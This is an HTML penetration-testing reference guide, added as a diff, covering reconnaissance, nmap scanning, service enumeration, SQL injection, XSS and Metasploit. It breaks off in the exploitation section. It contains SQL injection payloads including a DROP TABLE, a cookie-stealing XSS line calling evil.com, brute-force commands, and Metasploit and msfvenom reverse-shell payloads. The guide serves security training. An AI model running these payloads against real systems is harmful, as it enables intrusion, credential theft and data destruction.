@@ -1,0 +1,2484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security & Penetration Testing Mastery Guide</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a1a1a 100%);
+            min-height: 100vh;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 50px 20px;
+            background: linear-gradient(180deg, rgba(139, 0, 0, 0.3) 0%, transparent 100%);
+            border-bottom: 2px solid #8b0000;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff4444, #ff8800, #ffcc00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
+            text-shadow: 0 0 60px rgba(255, 68, 68, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            color: #888;
+            font-weight: 300;
+        }
+        
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: linear-gradient(135deg, #1a1a2e, #2a1a3e);
+            border: 1px solid #8b0000;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 0.85rem;
+            color: #ff6666;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .section {
+            background: linear-gradient(135deg, rgba(26, 26, 46, 0.9), rgba(20, 20, 35, 0.95));
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+        
+        .section:hover {
+            border-color: #8b0000;
+            box-shadow: 0 10px 50px rgba(139, 0, 0, 0.2);
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            color: #ff6666;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #333;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        h2::before {
+            content: '⚔️';
+            font-size: 1.5rem;
+        }
+        
+        h3 {
+            font-size: 1.3rem;
+            color: #ffaa00;
+            margin: 25px 0 15px 0;
+            padding-left: 15px;
+            border-left: 3px solid #ff8800;
+        }
+        
+        h4 {
+            font-size: 1.1rem;
+            color: #00ff88;
+            margin: 20px 0 10px 0;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        
+        .card {
+            background: rgba(10, 10, 20, 0.6);
+            border: 1px solid #2a2a3a;
+            border-radius: 12px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            border-color: #ff4444;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(255, 68, 68, 0.15);
+        }
+        
+        .card-title {
+            font-size: 1.1rem;
+            color: #00ffcc;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .card-title::before {
+            content: '►';
+            color: #ff4444;
+            font-size: 0.8rem;
+        }
+        
+        pre {
+            background: #0a0a15 !important;
+            border: 1px solid #2a2a3a;
+            border-radius: 10px;
+            padding: 18px !important;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 0.85rem !important;
+            margin: 15px 0;
+            line-height: 1.6 !important;
+        }
+        
+        code {
+            font-family: 'JetBrains Mono', monospace !important;
+            background: rgba(255, 100, 100, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+        
+        pre code {
+            background: transparent !important;
+            padding: 0 !important;
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 12px;
+            margin: 15px 0;
+        }
+        
+        .cmd-item {
+            background: rgba(139, 0, 0, 0.1);
+            border: 1px solid #3a1a1a;
+            border-radius: 8px;
+            padding: 12px 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+        
+        .cmd-item strong {
+            color: #ff8800;
+        }
+        
+        .cmd-item span {
+            color: #888;
+            display: block;
+            font-size: 0.75rem;
+            margin-top: 5px;
+        }
+        
+        .ascii-box {
+            background: #0a0a15;
+            border: 1px solid #2a2a3a;
+            border-radius: 10px;
+            padding: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            line-height: 1.4;
+            overflow-x: auto;
+            color: #00ff88;
+            white-space: pre;
+            margin: 20px 0;
+        }
+        
+        .warning-box {
+            background: linear-gradient(135deg, rgba(139, 0, 0, 0.2), rgba(180, 50, 0, 0.2));
+            border: 1px solid #8b0000;
+            border-radius: 10px;
+            padding: 18px 20px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .warning-box::before {
+            content: '⚠️';
+            font-size: 1.5rem;
+        }
+        
+        .tip-box {
+            background: linear-gradient(135deg, rgba(0, 100, 50, 0.2), rgba(0, 150, 100, 0.1));
+            border: 1px solid #008844;
+            border-radius: 10px;
+            padding: 18px 20px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .tip-box::before {
+            content: '💡';
+            font-size: 1.5rem;
+        }
+        
+        .attack-flow {
+            background: linear-gradient(90deg, #1a0a0a, #2a1a1a, #1a0a0a);
+            border: 1px solid #4a2020;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .attack-flow .step {
+            display: inline-block;
+            background: linear-gradient(135deg, #8b0000, #aa2222);
+            padding: 10px 20px;
+            border-radius: 8px;
+            margin: 5px;
+            font-weight: 600;
+            color: #fff;
+        }
+        
+        .attack-flow .arrow {
+            color: #ff4444;
+            font-size: 1.5rem;
+            margin: 0 10px;
+        }
+        
+        ul, ol {
+            margin: 15px 0;
+            padding-left: 25px;
+        }
+        
+        li {
+            margin: 8px 0;
+            color: #c0c0c0;
+        }
+        
+        li::marker {
+            color: #ff4444;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border: 1px solid #2a2a3a;
+        }
+        
+        th {
+            background: rgba(139, 0, 0, 0.3);
+            color: #ff8800;
+            font-weight: 600;
+        }
+        
+        td {
+            background: rgba(10, 10, 20, 0.5);
+        }
+        
+        tr:hover td {
+            background: rgba(139, 0, 0, 0.1);
+        }
+        
+        .quick-ref {
+            background: linear-gradient(135deg, #0a1a1a, #1a2a2a);
+            border: 2px solid #00aa88;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        
+        .quick-ref h4 {
+            color: #00ffcc;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .phase-indicator {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .phase {
+            text-align: center;
+            padding: 15px 25px;
+            background: linear-gradient(135deg, rgba(139, 0, 0, 0.2), rgba(50, 20, 20, 0.3));
+            border: 1px solid #4a2020;
+            border-radius: 10px;
+            flex: 1;
+            min-width: 150px;
+        }
+        
+        .phase.active {
+            border-color: #ff4444;
+            background: linear-gradient(135deg, rgba(139, 0, 0, 0.4), rgba(80, 30, 30, 0.3));
+        }
+        
+        .phase-num {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #ff4444;
+        }
+        
+        .phase-name {
+            font-size: 0.9rem;
+            color: #aaa;
+            margin-top: 5px;
+        }
+        
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .tool-card {
+            background: rgba(0, 50, 50, 0.3);
+            border: 1px solid #006666;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-card:hover {
+            border-color: #00ffcc;
+            transform: scale(1.02);
+        }
+        
+        .tool-card .name {
+            font-size: 1.1rem;
+            color: #00ffcc;
+            font-weight: 600;
+        }
+        
+        .tool-card .desc {
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 8px;
+        }
+        
+        .severity-critical { color: #ff0000; font-weight: bold; }
+        .severity-high { color: #ff6600; font-weight: bold; }
+        .severity-medium { color: #ffcc00; font-weight: bold; }
+        .severity-low { color: #00ff00; font-weight: bold; }
+        
+        .mitre-box {
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1f);
+            border: 2px solid #ff6600;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .mitre-box h4 {
+            color: #ff8800;
+            margin-bottom: 15px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 2px solid #333;
+            margin-top: 50px;
+            color: #666;
+        }
+        
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            .grid { grid-template-columns: 1fr; }
+            .command-grid { grid-template-columns: 1fr; }
+            .phase-indicator { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛡️ Cyber Security & Penetration Testing</h1>
+            <p class="subtitle">Comprehensive Reference Guide for Ethical Hackers & Security Professionals</p>
+            <div class="badge-container">
+                <span class="badge">Ethical Hacking</span>
+                <span class="badge">Penetration Testing</span>
+                <span class="badge">Network Security</span>
+                <span class="badge">Web Application Security</span>
+                <span class="badge">Malware Analysis</span>
+                <span class="badge">Digital Forensics</span>
+            </div>
+        </header>
+
+        <!-- Quick Reference Summary -->
+        <div class="quick-ref">
+            <h4>⚡ Quick Reference - Penetration Testing Phases</h4>
+            <div class="phase-indicator">
+                <div class="phase active">
+                    <div class="phase-num">1</div>
+                    <div class="phase-name">Reconnaissance</div>
+                </div>
+                <div class="phase">
+                    <div class="phase-num">2</div>
+                    <div class="phase-name">Scanning</div>
+                </div>
+                <div class="phase">
+                    <div class="phase-num">3</div>
+                    <div class="phase-name">Gaining Access</div>
+                </div>
+                <div class="phase">
+                    <div class="phase-num">4</div>
+                    <div class="phase-name">Maintaining Access</div>
+                </div>
+                <div class="phase">
+                    <div class="phase-num">5</div>
+                    <div class="phase-name">Covering Tracks</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 1: Reconnaissance -->
+        <section class="section">
+            <h2>Reconnaissance (Information Gathering)</h2>
+            <p>Information gathering is the first and most critical phase of penetration testing. The quality and quantity of information collected directly impacts the success of subsequent phases.</p>
+            
+            <h3>Passive Reconnaissance</h3>
+            <p>Passive reconnaissance involves gathering information without directly interacting with the target's systems. This method is stealthier and harder to detect.</p>
+            
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">OSINT Framework</div>
+                    <p>Open Source Intelligence gathering techniques and tools:</p>
+                    <ul>
+                        <li><strong>Google Dorking</strong> - Advanced search operators</li>
+                        <li><strong>WHOIS Lookup</strong> - Domain registration info</li>
+                        <li><strong>DNS Enumeration</strong> - DNS records discovery</li>
+                        <li><strong>Social Media</strong> - Employee information</li>
+                        <li><strong>Public Records</strong> - Business filings</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Google Dorking Operators</div>
+                    <div class="command-grid">
+                        <div class="cmd-item">
+                            <strong>site:target.com</strong>
+                            <span>Pages on specific domain</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>inurl:admin</strong>
+                            <span>URLs containing "admin"</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>filetype:pdf</strong>
+                            <span>Specific file types</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>intitle:"index of"</strong>
+                            <span>Directory listings</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>cache:target.com</strong>
+                            <span>Cached versions</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>link:target.com</strong>
+                            <span>Sites linking to target</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <h3>Active Reconnaissance</h3>
+            <p>Active reconnaissance involves direct interaction with the target's systems. While more informative, it's also more likely to be detected by security systems.</p>
+            
+            <pre><code class="language-bash"># DNS Enumeration with dig
+dig @8.8.8.8 target.com ANY
+dig axfr @ns1.target.com target.com  # Zone Transfer
+
+# DNS Enumeration with dnsenum
+dnsenum target.com
+
+# Subdomain Enumeration
+subfinder -d target.com -o subdomains.txt
+amass enum -d target.com
+
+# Directory Enumeration
+gobuster dir -u https://target.com -w /wordlists/dirb/common.txt
+ffuf -u https://target.com/FUZZ -w wordlist.txt</code></pre>
+            
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                    RECONNAISSANCE FLOW                               │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐        │
+│   │   Passive    │────▶│   Active     │────▶│   DNS/Network│        │
+│   │   OSINT      │     │   Scanning   │     │   Mapping    │        │
+│   └──────────────┘     └──────────────┘     └──────────────┘        │
+│          │                    │                    │                 │
+│          ▼                    ▼                    ▼                 │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐        │
+│   │ WHOIS/DNS    │     │ Port Scan    │     │ Service      │        │
+│   │ Social Media │     │ Banner Grab  │     │ Enumeration  │        │
+│   │ Google Dorks │     │ Vulnerability│     │ OS Fingerprint│       │
+│   └──────────────┘     └──────────────┘     └──────────────┘        │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+        </section>
+
+        <!-- Section 2: Network Scanning -->
+        <section class="section">
+            <h2>Network Scanning & Enumeration</h2>
+            <p>Network scanning identifies live hosts, open ports, running services, and potential vulnerabilities. This phase bridges reconnaissance and exploitation.</p>
+            
+            <h3>Nmap - The Network Mapper</h3>
+            <p>Nmap is the industry-standard network scanning tool, capable of host discovery, port scanning, service enumeration, and OS detection.</p>
+            
+            <pre><code class="language-bash"># Basic TCP Scan
+nmap -sS target.com                    # SYN Scan (Stealth)
+nmap -sT target.com                    # TCP Connect Scan
+nmap -sU target.com                    # UDP Scan
+
+# Service & Version Detection
+nmap -sV target.com                    # Version Detection
+nmap -sV --version-intensity 5 target  # Intensity 0-9
+
+# OS Detection
+nmap -O target.com                     # OS Fingerprinting
+nmap -O --osscan-guess target.com      # Aggressive guessing
+
+# Comprehensive Scans
+nmap -A target.com                     # Aggressive scan (OS, version, scripts, traceroute)
+nmap -sC -sV -O target.com            # Default scripts + version + OS
+
+# Network Discovery
+nmap -sn 192.168.1.0/24               # Ping sweep (no port scan)
+nmap -sP 192.168.1.0/24               # Host discovery
+
+# NSE Scripts
+nmap --script vuln target.com         # Vulnerability scripts
+nmap --script auth target.com         # Authentication scripts
+nmap --script brute target.com        # Brute force scripts
+nmap --script "http-*" target.com     # All HTTP scripts
+
+# Output Formats
+nmap -oN output.txt target.com        # Normal output
+nmap -oX output.xml target.com        # XML output
+nmap -oA output target.com            # All formats</code></pre>
+            
+            <h3>TCP Flags & Scan Types</h3>
+            <table>
+                <tr>
+                    <th>Scan Type</th>
+                    <th>Flags</th>
+                    <th>Response Open</th>
+                    <th>Response Closed</th>
+                </tr>
+                <tr>
+                    <td>SYN Scan (-sS)</td>
+                    <td>SYN</td>
+                    <td>SYN/ACK</td>
+                    <td>RST</td>
+                </tr>
+                <tr>
+                    <td>Connect Scan (-sT)</td>
+                    <td>SYN</td>
+                    <td>SYN/ACK → ACK</td>
+                    <td>RST</td>
+                </tr>
+                <tr>
+                    <td>FIN Scan (-sF)</td>
+                    <td>FIN</td>
+                    <td>No Response</td>
+                    <td>RST</td>
+                </tr>
+                <tr>
+                    <td>NULL Scan (-sN)</td>
+                    <td>None</td>
+                    <td>No Response</td>
+                    <td>RST</td>
+                </tr>
+                <tr>
+                    <td>XMAS Scan (-sX)</td>
+                    <td>FIN/PSH/URG</td>
+                    <td>No Response</td>
+                    <td>RST</td>
+                </tr>
+                <tr>
+                    <td>ACK Scan (-sA)</td>
+                    <td>ACK</td>
+                    <td>RST (unfiltered)</td>
+                    <td>No response (filtered)</td>
+                </tr>
+            </table>
+            
+            <h3>Service Enumeration</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">SMB Enumeration (Ports 139, 445)</div>
+                    <pre><code class="language-bash"># Enumerate SMB shares
+enum4linux -a target_ip
+
+# SMB share enumeration
+smbclient -L //target_ip -N
+
+# Nmap SMB scripts
+nmap --script smb-enum-shares,smb-enum-users target
+
+# CrackMapExec
+crackmapexec smb target_ip -u user -p pass --shares</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">SSH Enumeration (Port 22)</div>
+                    <pre><code class="language-bash"># SSH banner grab
+nc -nv target_ip 22
+
+# SSH enumeration script
+nmap --script ssh-auth-methods target
+nmap --script ssh-hostkey target
+
+# Brute force SSH
+hydra -l user -P wordlist.txt ssh://target_ip
+medusa -u user -P wordlist.txt -h target_ip -M ssh</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">FTP Enumeration (Port 21)</div>
+                    <pre><code class="language-bash"># Anonymous login check
+ftp target_ip
+# User: anonymous, Pass: anonymous@domain.com
+
+# Nmap FTP scripts
+nmap --script ftp-anon,ftp-bounce target
+
+# FTP brute force
+hydra -l user -P wordlist.txt ftp://target_ip</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">SNMP Enumeration (Port 161/UDP)</div>
+                    <pre><code class="language-bash"># SNMP walk
+snmpwalk -v2c -c public target_ip
+
+# OneSixtyOne (community string brute)
+onesixtyone -c community.txt target_ip
+
+# SNMP enumeration tools
+snmp-check target_ip
+nmap --script snmp-info target</code></pre>
+                </div>
+            </div>
+            
+            <div class="tip-box">
+                <div>
+                    <strong>Pro Tip:</strong> Always document your findings during scanning. Use tools like <code>CherryTree</code>, <code>Obsidian</code>, or simple markdown files to organize discovered hosts, ports, services, and potential vulnerabilities.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: Vulnerability Assessment -->
+        <section class="section">
+            <h2>Vulnerability Assessment</h2>
+            <p>Vulnerability assessment identifies and quantifies security weaknesses in systems. This phase prioritizes vulnerabilities based on severity and exploitability.</p>
+            
+            <h3>CVSS - Common Vulnerability Scoring System</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                    CVSS v3.1 Severity Ratings                        │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   Score Range    │  Severity    │  Color                            │
+│   ───────────────────────────────────────────                        │
+│     9.0 - 10.0   │  Critical    │  [████████████] Red               │
+│     7.0 - 8.9    │  High        │  [██████████  ] Orange            │
+│     4.0 - 6.9    │  Medium      │  [████████    ] Yellow            │
+│     0.1 - 3.9    │  Low         │  [████        ] Green             │
+│     0.0          │  None        │  [            ] Gray              │
+│                                                                      │
+│   CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H         │
+│                  │       │    │    │    │    │   │   │   │           │
+│               Version  │    │    │    │    │   │   │   └─Availability│
+│                   Attack│    │    │    │   │   └─────Integrity     │
+│                   Vector│  Privs │    Scope  └─────────Confidentiality│
+│                        │       │                                           │
+│                 Attack  User    User                               │
+│               Complexity Interaction                                   │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Vulnerability Scanning Tools</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Nessus</div>
+                    <p>Industry-standard vulnerability scanner with extensive plugin database.</p>
+                    <ul>
+                        <li>Comprehensive vulnerability detection</li>
+                        <li>Credentialed and non-credentialed scans</li>
+                        <li>Compliance checking</li>
+                        <li>Malware detection</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">OpenVAS</div>
+                    <p>Open-source vulnerability scanner, part of Greenbone Vulnerability Management.</p>
+                    <pre><code class="language-bash"># Start OpenVAS
+gvm-start
+
+# Create target and task via CLI
+gvm-cli --gmp-username admin \
+        --gmp-password pass \
+        socket --xml "<create_target>..."</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Nuclei</div>
+                    <p>Fast vulnerability scanner based on templates.</p>
+                    <pre><code class="language-bash"># Scan with templates
+nuclei -u https://target.com -t cves/
+
+# Custom templates
+nuclei -u target.com -t custom/
+
+# Severity filtering
+nuclei -u target.com -severity critical,high</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Nikto - Web Scanner</div>
+                    <p>Web server vulnerability scanner.</p>
+                    <pre><code class="language-bash"># Basic scan
+nikto -h https://target.com
+
+# Output to file
+nikto -h target.com -o output.html -Format htm
+
+# Use proxy
+nikto -h target.com -useproxy http://127.0.0.1:8080</code></pre>
+                </div>
+            </div>
+            
+            <h3>Common Vulnerability Categories</h3>
+            <table>
+                <tr>
+                    <th>Category</th>
+                    <th>Examples</th>
+                    <th>Tools to Detect</th>
+                </tr>
+                <tr>
+                    <td>Injection</td>
+                    <td>SQLi, Command Injection, LDAP Injection</td>
+                    <td>SQLMap, Commix, Burp Suite</td>
+                </tr>
+                <tr>
+                    <td>Authentication</td>
+                    <td>Broken Auth, Session Management</td>
+                    <td>Burp Suite, OWASP ZAP</td>
+                </tr>
+                <tr>
+                    <td>XSS</td>
+                    <td>Reflected, Stored, DOM-based</td>
+                    <td>XSStrike, Dalfox, Brute XSS</td>
+                </tr>
+                <tr>
+                    <td>XXE</td>
+                    <td>XML External Entity</td>
+                    <td>XXEinjector, Burp Suite</td>
+                </tr>
+                <tr>
+                    <td>File Inclusion</td>
+                    <td>LFI, RFI, Path Traversal</td>
+                    <td>LFISuite, Fimap</td>
+                </tr>
+                <tr>
+                    <td>Deserialization</td>
+                    <td>Insecure Deserialization</td>
+                    <td>ysoserial, GadgetProbe</td>
+                </tr>
+            </table>
+        </section>
+
+        <!-- Section 4: Web Application Security -->
+        <section class="section">
+            <h2>Web Application Security Testing</h2>
+            <p>Web application penetration testing identifies vulnerabilities in web applications, APIs, and web services. This includes testing authentication, authorization, input validation, and business logic.</p>
+            
+            <h3>OWASP Top 10 (2021)</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                    OWASP TOP 10 - 2021                               │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   A01: Broken Access Control                                         │
+│       └─ BOLA, Privilege Escalation, Directory Traversal            │
+│                                                                      │
+│   A02: Cryptographic Failures                                        │
+│       └─ Weak Encryption, Insecure Transmission, Poor Key Management │
+│                                                                      │
+│   A03: Injection                                                     │
+│       └─ SQLi, NoSQLi, Command, LDAP, XPath Injection               │
+│                                                                      │
+│   A04: Insecure Design                                               │
+│       └─ Missing Security Controls, Flawed Business Logic           │
+│                                                                      │
+│   A05: Security Misconfiguration                                     │
+│       └─ Default Creds, Verbose Errors, Unnecessary Features        │
+│                                                                      │
+│   A06: Vulnerable Components                                         │
+│       └─ Outdated Libraries, Unpatched Software                     │
+│                                                                      │
+│   A07: Auth Failures                                                 │
+│       └─ Weak Passwords, Session Fixation, Credential Stuffing      │
+│                                                                      │
+│   A08: Software/Data Integrity                                      │
+│       └─ Insecure Deserialization, Untrusted Sources                │
+│                                                                      │
+│   A09: Security Logging Failures                                    │
+│       └─ Insufficient Logging, Missing Monitoring                   │
+│                                                                      │
+│   A10: SSRF                                                         │
+│       └─ Server-Side Request Forgery                                │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>SQL Injection</h3>
+            <p>SQL injection remains one of the most critical web vulnerabilities. Understanding different injection techniques is essential for any penetration tester.</p>
+            
+            <pre><code class="language-bash"># SQLMap - Automated SQL Injection
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database --tables
+sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=123" -p user
+
+# With cookie
+sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"
+
+# SQLMap tamper scripts
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
+
+# Manual SQL Injection payloads
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+1; DROP TABLE users--</code></pre>
+            
+            <h3>Cross-Site Scripting (XSS)</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Reflected XSS</div>
+                    <p>Malicious script is reflected off the web server in error messages, search results, or any response that includes user input.</p>
+                    <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Stored XSS</div>
+                    <p>Malicious script is permanently stored on the target server (database, forum posts, comments).</p>
+                    <pre><code class="language-html">&lt;script&gt;
+document.location='http://evil.com/steal?c='+document.cookie
+&lt;/script&gt;</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">DOM-Based XSS</div>
+                    <p>Attack payload is executed by modifying the DOM environment in the victim's browser.</p>
+                    <pre><code class="language-html">#&lt;script&gt;alert('XSS')&lt;/script&gt;
+javascript:alert('XSS')</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">XSS Tools</div>
+                    <pre><code class="language-bash"># XSStrike
+python xsstrike.py -u "http://target.com/page?param="
+
+# Dalfox
+dalfox url "http://target.com/page?p="
+
+# Brute XSS
+brutexss -u "http://target.com" -p "param"</code></pre>
+                </div>
+            </div>
+            
+            <h3>Burp Suite Essentials</h3>
+            <p>Burp Suite is the de facto standard tool for web application security testing. Understanding its features is crucial for effective testing.</p>
+            
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                    BURP SUITE WORKFLOW                               │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   Browser ──▶ Proxy ──▶ Intercept ──▶ Repeater ──▶ Intruder         │
+│      │          │           │             │            │            │
+│      │          ▼           ▼             ▼            ▼            │
+│      │    [Intercept]  [Modify]      [Manual]    [Automate]        │
+│      │    Requests     Requests      Testing     Attacks           │
+│      │                                                               │
+│      └──────────▶ Target ◀─────────────────────────────┘           │
+│                      │                                               │
+│                      ▼                                               │
+│               [Site Map]     [Issues]      [Logger]                 │
+│                 Sitemap    Vulnerabilities  History                 │
+│                                                                      │
+│   Extensions: SQLiPy, J2EEScan, JWT Editor, Retire.js               │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <pre><code class="language-bash"># Burp Suite Command Line
+java -jar burpsuite_pro.jar --project-file=project.burp
+
+# Headless mode with config
+java -jar burpsuite_pro.jar --config-file=config.json
+
+# Common Keyboard Shortcuts
+# Ctrl+R    - Send to Repeater
+# Ctrl+I    - Send to Intruder
+# Ctrl+F    - Forward request
+# Ctrl+S    - Save project</code></pre>
+        </section>
+
+        <!-- Section 5: Exploitation -->
+        <section class="section">
+            <h2>Exploitation Techniques</h2>
+            <p>Exploitation is the phase where identified vulnerabilities are leveraged to gain unauthorized access or escalate privileges. This requires careful planning and execution.</p>
+            
+            <div class="warning-box">
+                <div>
+                    <strong>Legal Warning:</strong> Exploitation techniques should ONLY be used on systems you have explicit written permission to test. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.
+                </div>
+            </div>
+            
+            <h3>Metasploit Framework</h3>
+            <p>Metasploit is the world's most used penetration testing framework, providing tools for exploitation, payload generation, and post-exploitation.</p>
+            
+            <pre><code class="language-bash"># Start Metasploit
+msfconsole
+
+# Basic Exploitation Workflow
+msf6 > search type:exploit platform:windows smb
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS target_ip
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST attacker_ip
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+# Meterpreter Commands
+meterpreter > sysinfo              # System information
+meterpreter > getuid              # Current user
+meterpreter > hashdump            # Dump password hashes
+meterpreter > shell               # Drop to shell
+meterpreter > migrate PID         # Migrate to another process
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Payload Generation (msfvenom)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o payload.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp -o payload.asp
